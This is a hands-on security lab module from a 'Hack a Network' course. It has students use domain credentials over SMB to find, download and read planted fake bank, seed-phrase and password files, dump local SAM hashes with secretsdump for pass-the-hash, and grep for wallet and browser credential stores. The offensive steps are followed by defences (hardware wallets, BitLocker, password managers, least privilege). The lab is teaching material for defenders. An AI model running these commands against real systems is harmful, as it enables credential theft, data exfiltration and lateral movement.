---
title: "Scenario 09 - Loot and exfiltration (the 'what they actually lose' step)"
---

# Scenario 09 - Loot and exfiltration (the "what they actually lose" step)

> **Journey:** "Hack a Network" - module 09 of the series.
> **Ethics / scope:** every target here is a VM **we own** on the isolated a local model net
> (`10.13.37.0/24`), with **no route to the real LAN or the internet**. The "bank" and "crypto"
> files are planted `FLAG-...` strings, all fake, never a real statement or key. Doing any of this
> to someone else's machine or network is a crime. The whole point of the module is the **Defense**
> column: how each step is stopped.

| | |
|---|---|
| **Goal** | Turn the domain credentials from module 08 into real impact: reach the victim desktop over SMB, find the planted "bank / crypto / password" loot, read it, and copy it back to the attacker. Then learn the defences that make the loot worthless even after a full compromise. |
| **Target** | `win-cli` `10.13.37.51` (Win11, domain `hacklab.local`, holds the loot). Secondary: `win-dc` `10.13.37.50` for the credential-access step. |
| **Difficulty** | Beginner-to-intermediate (all commands given verbatim). |
| **Est. time** | 30-45 min. |
| **Prereqs** | Module 08 finished, so you hold the domain creds: `j.mueller` / `Hacklab2026!` (normal user) and `svc-backup` / `Hacklab2026!` (**deliberately in Domain Admins**). Also `labadmin` / `Hacklab2026!` (local admin on win-cli). You are working at the **Kali** desktop (`10.13.37.10`, `kali`/`kali`). |
| **Start-from** | Kali snapshot `tools-ready`. The two Windows VMs powered on (host-side: `virsh -c qemu:///system start win-dc win-cli`; give the DC ~1 min, then the client). NAT NIC on Kali may be detached (this step needs only the hacklab net). |

## MITRE ATT&CK mapping
| Technique | ID | Where in this module |
|---|---|---|
| Valid Accounts (Domain) | T1078.002 | Using `svc-backup` / `j.mueller` |
| Remote Services: SMB / Admin Shares | T1021.002 | Reaching `C$` on win-cli |
| Data from Network Shared Drive | T1039 | Browsing `\\win-cli\C$\...\Public\Documents` |
| Data from Local System | T1005 | Reading the planted files |
| Unsecured Credentials: Credentials In Files | T1552.001 | Grepping for wallet / kdbx / seed / password patterns |
| OS Credential Dumping: SAM | T1003.002 | `secretsdump` pulling local hashes for pass-the-hash |
| Exfiltration Over C2 Channel | T1041 | Copying the loot back to Kali (over SMB it is technically T1048, Exfiltration Over Alternative Protocol - noted for completeness) |

---

## Steps (attacker view, run on Kali)

All commands are typed in a terminal on the Kali desktop. Set the target once so the rest copy-paste
cleanly:

```
export TARGET=10.13.37.51
export DC=10.13.37.50
export DOMAIN=hacklab.local
mkdir -p ~/loot && cd ~/loot
```

### 1. Confirm the box is up and the creds are valid
`netexec` (the `nxc` command) sprays a credential at SMB and tells you what it unlocks.

```
nxc smb $TARGET -u svc-backup -p 'Hacklab2026!' -d $DOMAIN
```
**What it does:** authenticates to win-cli's SMB service as the backup service account.
**What you should see:** a line ending in `[+] hacklab.local\svc-backup:Hacklab2026! (Pwn3d!)`.
The **`(Pwn3d!)`** tag means this account has **local administrator** rights on win-cli, because
`svc-backup` is a Domain Admin. Compare with the normal user:

```
nxc smb $TARGET -u j.mueller -p 'Hacklab2026!' -d $DOMAIN
```
**What you should see:** `[+] ...j.mueller:Hacklab2026!` with **no** `(Pwn3d!)`. Same password, far
less power. That gap is the whole lesson of least privilege (module 05).

### 2. Enumerate the shares you can reach
```
nxc smb $TARGET -u svc-backup -p 'Hacklab2026!' -d $DOMAIN --shares
```
**What it does:** lists SMB shares and your access to each.
**What you should see:** `ADMIN$`, `C$`, `IPC$` with **READ/WRITE** for `svc-backup`. `C$` is the whole
system drive: that is the keys to the desktop.

### 3. Find the loot without downloading everything (spider)
The loot lives at `C:\Users\Public\Documents`. Spider the drive for the interesting file types a real
attacker hunts (statements, wallets, key stores, password vaults):

```
nxc smb $TARGET -u svc-backup -p 'Hacklab2026!' -d $DOMAIN \
  -M spider_plus -o DOWNLOAD_FLAG=False EXCLUDE_DIRS=Windows,'Program Files','Program Files (x86)'
```
**What it does:** the `spider_plus` module walks every readable share and records a JSON inventory of
files (under `~/.nxc/modules/nxc_spider_plus/` or `/tmp/nxc_hosted/`, path printed at the end) without
pulling them yet.
**What you should see:** the inventory listing files under `Users/Public/Documents/`, including the
three planted ones (a statement PDF, a wallet/seed file, a credentials note).

If you prefer to browse interactively, use the impacket SMB client (`smbclient.py`, installed on Kali as
`impacket-smbclient`):

```
impacket-smbclient hacklab.local/svc-backup:'Hacklab2026!'@$TARGET
# at the prompt:
use C$
cd Users\Public\Documents
ls
```
**What you should see:** the directory listing with `FLAG-BANK`, `FLAG-SEED`, `FLAG-CREDS`
files (names may be e.g. `statement.pdf`, `wallet.dat` / `seed.txt`, `passwords.txt` / a `.kdbx`).

### 4. Exfiltrate (copy the loot back to Kali)
Still inside the `impacket-smbclient` prompt, pull each file down:

```
# inside the smbclient prompt, in C$\Users\Public\Documents:
get statement.pdf
get seed.txt
get passwords.txt
exit
```
**What it does:** `get` copies the file over SMB from the victim to your current Kali directory
(`~/loot`).
**What you should see:** `[*] Downloading ...` for each, and the files now present in `~/loot`.

Non-interactive equivalent with netexec (handy for scripting the whole grab):

```
nxc smb $TARGET -u svc-backup -p 'Hacklab2026!' -d $DOMAIN \
  --get-file 'Users\Public\Documents\seed.txt' ./seed.txt
```

### 5. Read the loot on Kali
```
cat ~/loot/seed.txt ~/loot/passwords.txt
# a PDF: pdftotext ~/loot/statement.pdf - | head
```
**What you should see (all fake):**
- the statement PDF -> **FLAG-BANK**
- the seed / wallet file -> **FLAG-SEED** (a fake 12-word seed, never a real key)
- the credentials note -> **FLAG-CREDS** (a reused password)

This is the moment that makes the impact concrete for the class: with one over-privileged service
account, the attacker now holds the victim's "bank statement", "crypto seed", and a reused password.

### 6. The pattern hunt (a technique, not just these three files)
Real loot is not conveniently named `FLAG-`. Show the grep-for-secrets pattern the tooling automates.
Against the drive over SMB you would spider for extensions; on files already pulled to Kali:

```
cd ~/loot
grep -riaEl 'seed|mnemonic|xprv|BEGIN (RSA|OPENSSH|PGP)|password|passphrase|wallet' .
# and, for the classic file-name hunt an attacker runs on the victim drive:
#   *.kdbx  wallet.dat  *.wallet  seed*.txt  *seedphrase*  Login\ Data  key3.db  logins.json
```
**What it does:** finds credential-bearing files by content and by the well-known names of KeePass
vaults (`.kdbx`), Bitcoin Core wallets (`wallet.dat`), and browser credential stores (Chrome
`Login Data`, Firefox `logins.json`/`key3.db`).
**What you should see:** matches on the planted files. In this lab they are fake; on a real box these
are exactly the artefacts that end a person's financial privacy.

### 7. Credential access - prove the compromise cascades (T1003.002)
Because `svc-backup` is local admin on win-cli, you can dump the local secret store and get password
hashes you can replay elsewhere (pass-the-hash) without ever cracking a password:

```
impacket-secretsdump hacklab.local/svc-backup:'Hacklab2026!'@$TARGET
```
**What it does:** `secretsdump` reads the local SAM (local account hashes), LSA secrets, and any cached
domain credentials from win-cli.
**What you should see:** NTLM hashes for local accounts (e.g. `labadmin`) in the form
`user:RID:LM:NT:::`. Those hashes are a valid credential: `nxc smb <host> -u labadmin -H <NThash>`
authenticates without the plaintext. That is how looting one desktop turns into owning the next
(module carries into privilege-escalation / lateral movement).

---

## Defense

The offensive lesson is that once a networked PC is compromised, everything on its disk is gone. The
defensive lesson is how to make that compromise **not matter** for the things that count. Four controls,
in priority order:

### D1 - A hardware wallet, and the seed kept OFFLINE (the one that matters most)
A seed phrase or `wallet.dat` sitting on a general-purpose, networked computer is **already lost** the
moment the host is owned - which this whole module just demonstrated in three commands. Self-custody
means the private key is generated on and never leaves a dedicated signing device (a hardware wallet);
the networked PC only ever sees public data and unsigned transactions. There is no seed file on disk for
step 3 or step 6 to find.

**Sovereignty framing (brief):** "not your keys, not your coins" has a quieter corollary: *your keys are
only yours if the attacker who owns your PC still cannot spend them.* A key that a remote attacker can
copy was never truly self-custodied. The hardware wallet is what turns "I hold my own keys" from a
slogan into a fact that survives a full desktop compromise.

**Prove the fix:** remove the seed file from the victim (simulating "the seed never lived here"):
```
# host-side, via the Windows console or a remote admin session, delete C:\Users\Public\Documents\seed.txt
```
then re-run **step 6**'s grep and the spider from **step 3**. There is no wallet/seed match to find:
```
nxc smb $TARGET -u svc-backup -p 'Hacklab2026!' -d $DOMAIN -M spider_plus -o DOWNLOAD_FLAG=False
# inventory no longer lists a seed/wallet file -> FLAG-SEED is uncapturable
```

### D2 - Full-disk encryption (BitLocker)
FDE protects data **at rest** against an attacker with the physical disk (a stolen laptop, a lifted
drive). Note the scope honestly: BitLocker does **not** stop the live-session SMB theft you did in steps
1-5, because the OS is running and decrypting for an authorised admin. It closes the "someone walks off
with the machine" path.

**Prove the fix:** with BitLocker on, an offline read of the volume (mounting the `.qcow2` or the disk on
another machine) yields ciphertext, not `FLAG-BANK`. In the lab you can demonstrate the principle by
showing that without the recovery key/TPM unlock the volume will not mount readable.

### D3 - A password manager, not browser autofill
Browser-saved passwords (`Login Data`, `logins.json`) are trivially harvested once the profile is read,
which is exactly the step-6 hunt. A dedicated password manager keeps a single encrypted vault with a
strong master secret that is never stored on disk in the clear.

**Prove the fix:** re-run the step-6 name hunt after clearing browser autofill. `Login Data`/`logins.json`
either do not exist or contain no usable secrets; the credential harvest comes up empty.

### D4 - Least privilege (why `svc-backup` should NOT be a Domain Admin)
The entire chain worked because a *service* account had Domain Admin, which gave it local admin on the
desktop (`Pwn3d!`), which gave `C$` and `secretsdump`. Service accounts should have the minimum rights
for their job and nothing more.

**Prove the fix (do this on the DC, then re-attack):**
```
# on win-dc, remove svc-backup from Domain Admins:
#   Remove-ADGroupMember -Identity "Domain Admins" -Members svc-backup -Confirm:$false
```
then re-run **step 1** and **step 2** from Kali:
```
nxc smb $TARGET -u svc-backup -p 'Hacklab2026!' -d $DOMAIN --shares
```
**What you should now see:** no `(Pwn3d!)` tag, `C$`/`ADMIN$` show **no access** (or are absent), and
`impacket-secretsdump` fails with `Access denied`. The loot at `C:\Users\Public\Documents` is no longer
reachable with that account.

---

## Wrap-up

**Flags / evidence:** `FLAG-BANK`, `FLAG-SEED`, `FLAG-CREDS` (all fake), captured in `~/loot` on Kali.
Evidence for the write-up: the `(Pwn3d!)` line, the share list, the spider inventory JSON, the
`secretsdump` hash output, and the before/after of the D1 and D4 "prove the fix" re-runs.

**Cleanup / reset:** the loot and the `secretsdump` write to win-cli's registry mean you should revert
the victim to a clean state before the next run. Windows VMs use **external UEFI snapshots**, so shut
down first:
```
virsh -c qemu:///system shutdown win-cli   # wait for it to power off
virsh -c qemu:///system snapshot-revert win-cli clean-baseline
# if you changed the DC in D4, likewise:
virsh -c qemu:///system shutdown win-dc && virsh -c qemu:///system snapshot-revert win-dc clean-baseline
```
On Kali, `rm -rf ~/loot` when you are done, or keep it for the capstone report.

**Go deeper: ** Research: In module 09, why does svc-backup get (Pwn3d!) on win-cli but j.mueller does not, when both have the same password?
